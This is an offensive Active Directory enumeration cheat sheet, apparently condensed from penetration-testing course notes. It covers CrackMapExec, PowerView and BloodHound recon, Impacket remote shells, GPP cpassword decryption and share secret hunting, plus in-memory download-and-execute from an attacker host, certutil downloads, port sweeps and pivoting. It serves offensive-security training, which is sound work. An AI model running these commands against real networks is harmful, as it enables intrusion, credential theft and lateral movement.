# 3 · Enumerate with credentials

> **Goal:** with your first valid credentials, map the domain deeply — users, groups, computers,
> sessions, ACLs, shares, security controls — to find the path to Domain Admin. Corresponds to
> phase **3 · enumerate with credentials** (enum linux, enum windows, off the land, sec controls).
>
> Condensed from `htbad/` (13, 14, 15, 16) and `offad/` (03–13). `{{VAR}}` placeholders filled by
> [WorkflowHelper.html](../WorkflowHelper.html).

---

## Security controls (check before you make noise)

```powershell
Get-MpComputerStatus                                             # Defender status (RealTimeProtection?)
sc query windefend                                               # is the AV service running?
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # app allow/deny lists
$ExecutionContext.SessionState.LanguageMode                      # FullLanguage vs ConstrainedLanguage
netsh advfirewall show allprofiles                               # host firewall
# LAPS (from LAPSToolkit)
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

## From Linux (CrackMapExec / Impacket / ldap)

```bash
# CrackMapExec SMB — the workhorse
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --groups
sudo crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share '{{SHARE_NAME}}'
head -n 10 /tmp/cme_spider_plus/{{DC_IP}}.json

# smbmap — share access + recursive listing
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}}
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R '{{SHARE_NAME}}' --dir-only

# rpcclient (then: enumdomusers, querygroup, etc.)
rpcclient -U "" -N {{DC_IP}}

# windapsearch — targeted LDAP queries
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} --da   # Domain Admins
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -PU    # privileged users

# Impacket remote exec (validate creds / get a shell)
impacket-psexec  {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}
impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{DC_IP}}

# BloodHound collection from Linux (no Windows box needed)
sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all
```

---

## From Windows — LOLBINs & no-RSAT enumeration

### net.exe (built-in, every Windows — but misses nested groups)

```cmd
net user /domain
net user {{TARGET_USER}} /domain          :: check Global Group memberships (e.g. *Domain Admins)
net group /domain
net group "{{GROUP_NAME}}" /domain
net accounts                              :: local password/lockout policy
```

> **Limitation:** `net group` lists only *user* members — it silently misses **nested groups**. Use
> LDAP/PowerView below to catch inherited membership.

### Pure PowerShell LDAP via ADSI (no RSAT, works as any domain user / SYSTEM)

```powershell
([adsisearcher]'(objectClass=user)').FindAll().Properties.samaccountname          # all users
([adsisearcher]'(objectClass=computer)').FindAll().Properties.name                # all computers
([adsisearcher]'(name={{COMPUTER_NAME}})').FindAll().Properties.dnshostname        # one computer
([adsisearcher]'(samaccountname={{USERNAME}})').FindAll().Properties.serviceprincipalname
([adsisearcher]'(servicePrincipalName=*)').FindAll().Properties.samaccountname     # kerberoastable
```

### Hand-rolled LDAP enumerator (offad — dependency-free, reveals nested groups)

```powershell
powershell -ep bypass
# reusable function.ps1 — builds LDAP://PDC/DN dynamically, no hardcoding
function LDAPSearch {
    param ( [string]$LDAPQuery )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"    # all users
LDAPSearch -LDAPQuery "(objectclass=group)"           # all groups (incl. domain-local net.exe misses)
# walk nested groups
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn={{GROUP_NAME}}))"
$group.properties.member
```

### dsquery (needs RSAT — DCs / admin boxes only, not a stock member server)

```powershell
dsquery user
dsquery computer
dsquery * "CN=Users,DC={{DOMAIN_NB}},DC=LOCAL"
# disabled accounts (UAC bit 2)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

### RSAT ActiveDirectory module (when available)

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "{{GROUP_NAME}}"
```

---

## PowerView (the primary Windows enum tool)

> Kali copy: `cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .` — serve & pull it.

```powershell
Import-Module .\PowerView.ps1

# domain / users / groups
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon          # pwdlastset/lastlogon flag dormant + weak accts
Get-NetGroup | select cn
Get-NetGroup "{{GROUP_NAME}}" | select member
Get-DomainUser -Identity {{USERNAME}} -Domain {{DOMAIN}} | Select-Object name,samaccountname,description,memberof,pwdlastset,lastlogontimestamp,admincount,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# computers / OS (map the estate, spot the oldest = soft target — no port scan)
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

# trusts
Get-DomainTrustMapping

# where am I / who is local admin
Test-AdminAccess -ComputerName {{COMPUTER_NAME}}
Find-LocalAdminAccess                                  # sprays every computer for local admin rights

# SPN accounts (kerberoast targets)
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

SharpView (compiled PowerView, same functions — evades some AMSI/script-block logging):

```powershell
.\SharpView.exe Get-DomainUser -Identity {{USERNAME}}
```

---

## Sessions & logged-on users (find where privileged users are)

```powershell
# PowerView — often "Access denied" on modern Windows (SrvsvcSessionInfo ACL locked since 1709)
Get-NetSession -ComputerName {{COMPUTER_NAME}} -Verbose
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

# PsLoggedOn (Sysinternals) — needs Remote Registry on the target (on for many servers)
.\PsLoggedon.exe \\{{COMPUTER_NAME}}
```

> The winning combo: a host where **you are local admin** *and* a **privileged user has a session** →
> steal their creds (phase 4). BloodHound surfaces these automatically.
>
> **`Find-LocalAdminAccess` comes back empty everywhere?** Then escalate *locally* on your foothold
> box to admin/SYSTEM first — Windows privesc playbook: [`../privilege/windows.md`](../privilege/windows.md)
> (start with [situational awareness](../privilege/windows.md#1712-situational-awareness) +
> `whoami /priv`). Local admin/SYSTEM is the prerequisite for the LSASS credential theft in phase 4.

---

## Service Principal Names (SPN discovery)

```cmd
setspn -L {{TARGET_USER}}                  :: SPNs for one account (e.g. iis_service → HTTP/web04)
setspn.exe -T {{DOMAIN}} -Q */*            :: every SPN in the domain
```

```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe {{COMPUTER_NAME}}.{{DOMAIN}}  :: resolve the SPN host to attack the service
```

> Service accounts often have elevated privileges → prime Kerberoast targets (phase 4).

---

## Domain shares & SYSVOL looting

```powershell
# PowerView
Find-DomainShare
Find-DomainShare -CheckShareAccess          # only shares the current user can read

# SYSVOL — readable by every domain user; hunt Group Policy Preferences for cpassword
ls  \\{{DC_IP}}\sysvol\{{DOMAIN}}\Policies\
cat \\{{DC_IP}}\sysvol\{{DOMAIN}}\Policies\oldpolicy\old-policy-backup.xml
```

```bash
# decrypt a GPP cpassword (AES key is public) — yields a local-admin password
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

Snaffler — automated hunt for secrets across readable shares:

```powershell
iwr https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe -OutFile Snaffler.exe
.\Snaffler.exe -d {{DOMAIN_UPPER}} -s -v data -o snaffler.log
```

> Catalog every credential and the emerging **password pattern** — it seeds spraying/brute-force.

---

## BloodHound / SharpHound (graph the attack paths)

> The collector version **must match** the GUI or ingest fails — safest to download SharpHound from
> inside the BloodHound GUI you're running.

### Collect on a Windows target

```powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory {{OUTPUT}} -OutputPrefix "corp audit"
# or the EXE
.\SharpHound.exe -c All --zipfilename {{OUTPUT}}
```

### Get the output off the foothold

> Collected on a remote foothold (e.g. `bloodhound-python` writes `*_users.json` etc. to `~`)? Pull
> it to the box running the GUI. Zip first — BloodHound ingests the zip directly.

```bash
# on the foothold
zip bh.zip *.json
# from the box with the GUI — <foothold-user> is the SSH login (e.g. htb-student), NOT your AD user
# quote the glob so YOUR shell doesn't expand it before scp runs
scp <foothold-user>@<foothold-ip>:bh.zip .
scp <foothold-user>@<foothold-ip>:'*.json' .        # or grab the raw files
```

> No scp? Serve + fetch: `python3 -m http.server 8000` on the foothold, `wget` each file from the GUI
> box. Or skip the copy entirely if BloodHound/neo4j is installed **on the foothold** — run it there.

### Analyze on Kali

```bash
sudo neo4j start            # web UI http://localhost:7474, default neo4j:neo4j (forced reset)
bloodhound
```

BloodHound CE via Docker (Windows):

```powershell
curl.exe -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose up -d
docker compose logs bloodhound | Select-String "Initial"   # grab admin password, browse :8080
```

**GUI workflow:** Upload Data → drag the SharpHound zip → *Find Shortest Paths to Domain Admins* →
right-click your controlled objects → *Mark as Owned* → *Shortest Paths from Owned Principals*.
Right-click any edge → **Help** for Abuse/Opsec/References. Other useful pre-built pulls: *List all
Kerberoastable Accounts*, *Find Computers where Domain Users are Local Admin*, *Find Workstations /
Servers where Domain Users can RDP*.

### Cypher cheat-sheet (Explore → Cypher tab)

> Node names are UPPERCASE `SAM@DOMAIN.LOCAL`; group filters like `STARTS WITH "DOMAIN ADMINS"` keep
> queries domain-agnostic. `owned:true` / `highvalue:true` only exist after you **Mark as Owned/High
> Value** in the GUI — an empty "from owned" result usually means you forgot to mark a node.

```cypher
-- the money queries
MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) RETURN p   -- owned → high value
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name STARTS WITH "DOMAIN ADMINS" RETURN u
MATCH p=(u {owned:true})-[r]->(m) RETURN p                       -- one-hop: what owned can touch
MATCH p=(c:Computer)-[:HasSession]->(u:User) RETURN p            -- active sessions: who is logged on where

-- roasting / cred targets
MATCH (u:User) WHERE u.hasspn=true AND NOT u.name STARTS WITH "KRBTGT" RETURN u   -- Kerberoastable
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u              -- AS-REP roastable
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name,u.description  -- creds in description

-- privileges / delegation
MATCH (u {owned:true})-[:AdminTo]->(c:Computer) RETURN u,c       -- boxes owned user admins
MATCH (u {owned:true})-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN u  -- DCSync rights
MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c -- unconstrained delegation
MATCH (u:User) WHERE u.admincount=true RETURN u                  -- protected/admin-tagged users

-- who can TAKE OVER a target object (e.g. "who has GenericAll over Domain Admins")
MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p
MATCH p=(n)-[r]->(t {name:"<TARGET>@DOMAIN.LOCAL"}) WHERE r.isacl RETURN p   -- ALL inbound control edges on any object

-- filtering idioms
MATCH (n:User) WHERE n.name =~ "(?i).*SVC.*" RETURN n            -- case-insensitive regex (service accts)
MATCH (n:User) WHERE n.enabled=true RETURN n.name               -- enabled accounts only
MATCH (n) RETURN n LIMIT 500                                     -- "show everything" (small domains only)
```

> **Set owned via Cypher** (instead of clicking each): `MATCH (u:User) WHERE u.name IN
> ["AB920@INLANEFREIGHT.LOCAL","BR086@INLANEFREIGHT.LOCAL"] SET u.owned=true RETURN u`.
> **Trust the DC over the graph** for roasting — a `bloodhound-python` run under one low-priv user can
> miss SPNs; confirm with `GetUserSPNs.py` (phase 4) before concluding "nothing roastable".

---

## Off-the-land: tool transfer & internal host discovery

### Serve from Kali, pull on target

```bash
python3 -m http.server 80                          # HTTP
impacket-smbserver share . -smb2support            # SMB share "share"
```

```powershell
iwr http://{{LHOST}}/tool.exe -OutFile C:\Windows\Temp\tool.exe   # PowerShell download
\\{{LHOST}}\share\tool.exe                                         # run from SMB, no local copy
IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/script.ps1')   # in-memory
```

```cmd
certutil -urlcache -f http://{{LHOST}}/tool.exe tool.exe          :: certutil LOLBIN
```

```bash
wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh               # Linux
```

### What can this box reach? (pivot recon — run on the foothold)

```cmd
ipconfig /all & route print & arp -a & netstat -ano
```

```bash
ip a; ip route; ip neigh; cat /etc/hosts; ss -antup
```

### Ping / port sweep an internal /24

> `{{NETWORK}}` = internal /24 prefix, first 3 octets only (e.g. `10.10.10`).

```powershell
1..254 | % { $ip="{{NETWORK}}.$_"; if (Test-Connection -Count 1 -Quiet -ComputerName $ip) { "$ip up" } }
1..254 | % { $ip="{{NETWORK}}.$_"; if ((New-Object Net.Sockets.TcpClient).ConnectAsync($ip,445).Wait(200)) { "$ip:445 open" } }
```

```bash
for i in $(seq 1 254); do (ping -c1 -W1 {{NETWORK}}.$i >/dev/null && echo "{{NETWORK}}.$i up") & done; wait
for i in $(seq 1 254); do (echo > /dev/tcp/{{NETWORK}}.$i/445) 2>/dev/null && echo "{{NETWORK}}.$i:445 open"; done
```

### Reach an internal host through the foothold (pivoting)

> **Found a host Kali can't route to?** Forward a port through the foothold to reach it — full
> playbook (netsh portproxy, chisel, ssh `-L`/`-D`/`-R`, sshuttle, plink, dnscat2) in
> [`../tunnelling/tunnelling.md`](../tunnelling/tunnelling.md). OSCP go-to: **chisel** reverse
> SOCKS or **`ssh -D`** + proxychains for a whole subnet.
